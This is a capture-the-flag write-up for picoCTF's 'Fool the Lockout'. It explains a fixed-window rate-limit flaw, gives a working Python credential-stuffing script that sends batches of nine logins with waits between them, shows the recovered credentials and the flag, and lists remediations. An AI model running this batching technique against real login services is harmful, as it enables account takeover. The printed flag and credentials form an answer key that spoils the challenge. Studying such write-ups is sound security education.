# picoCTF — Fool the Lockout Writeup

**Category:** Web Exploitation  
**Difficulty:** Medium  
**Points:** 200  
**Author:** David Gaviria  

---

## Challenge Description

A friend built a login page with IP-based rate limiting to prevent brute forcing.
They gave us:
- Full source code (`app.py`)
- A credential dump (`creds-dump.txt`) containing 100 username:password pairs
- One of those pairs is the valid account

Goal: bypass the rate limit, find the valid credentials, and capture the flag.

---

## Source Code Analysis

### The User Database

The app stores users in a dictionary loaded from `/challenge/profile.json` at startup.
One of the 100 pairs in `creds-dump.txt` matches the stored credentials.

### The Rate Limiting Logic

```
MAX_REQUESTS = 10       # max failed attempts before lockout
EPOCH_DURATION = 30     # timeframe for counting attempts (seconds)
LOCKOUT_DURATION = 120  # how long the lockout lasts (seconds)
```

Every POST request increments a counter for the client IP. If the counter exceeds
MAX_REQUESTS within EPOCH_DURATION seconds, the IP is locked out for LOCKOUT_DURATION.

The counter resets when this condition is met in refresh_request_rates_db():

```
if curr_time - epoch_start_time > EPOCH_DURATION:
    request_rates[client_ip]["num_requests"] = 0
    request_rates[client_ip]["epoch_start"] = -1
```

---

## The Vulnerability

The epoch timer starts on the **first request** and resets the counter after 30 seconds.
This means we can send 9 attempts, wait 32 seconds, and the counter resets to 0 —
allowing us to try 9 more credentials indefinitely.

```
Attempt 1-9   → counter = 9  (under limit of 10)
Wait 32s      → counter resets to 0
Attempt 10-18 → counter = 9  (under limit again)
Wait 32s      → counter resets to 0
... repeat until found
```

---

## Exploit Script

```python
import requests
import time
import re
import sys

TARGET     = 'http://candy-mountain.picoctf.net:61348'
BATCH_SIZE = 9
SLEEP      = 32

creds = []
with open('creds-dump.txt') as f:
    for line in f:
        user, pw = line.strip().split(';', 1)
        creds.append((user, pw))

print(f'[*] Loaded {len(creds)} credential pairs')

batch_count = 0
i = 0
s = requests.Session()

while i < len(creds):
    user, pw = creds[i]

    if batch_count == BATCH_SIZE:
        print(f'\n[*] Waiting {SLEEP}s for rate limit reset...\n')
        time.sleep(SLEEP)
        batch_count = 0

    batch_count += 1
    print(f'[TRY] {user}:{pw}')

    r = s.post(
        f'{TARGET}/login',
        data={'username': user, 'password': pw},
        allow_redirects=False
    )

    if r.status_code in (301, 302):
        print(f'\n[SUCCESS] {user}:{pw}')
        home = s.get(f'{TARGET}/')
        flag = re.search(r'picoCTF\{[^}]+\}', home.text)
        if flag:
            print(f'[FLAG] {flag.group(0)}')
        sys.exit(0)

    i += 1
```

Key points:
- `requests.Session()` outside the loop preserves the cookie after login
- `allow_redirects=False` detects success via 301/302 status code
- Batch size 9 stays safely under the MAX_REQUESTS threshold of 10

---

## Execution Output

```
[*] Loaded 100 credential pairs
[TRY] rora:winner1
[TRY] birendra:rumble
...
[*] Waiting 32s for rate limit reset...
...
[SUCCESS] germ:bigguns
[FLAG] picoCTF{f00l_7h4t_l1m1t3r_e5c7c994}
```

Valid credentials: `germ:bigguns`
Found after 25 attempts across 3 batches.

---

## Remediation

- Use a sliding window or token bucket algorithm instead of fixed epoch reset
- Account lockout (not just IP-based) after failed attempts
- CAPTCHA after N failed attempts
- Exponential backoff instead of fixed lockout duration

---

## Summary

| Field | Value |
|-------|-------|
| Vulnerability | Exploitable rate limit reset window |
| Method | Batched credential stuffing |
| Valid credentials | germ:bigguns |
| Flag | picoCTF{f00l_7h4t_l1m1t3r_e5c7c994} |
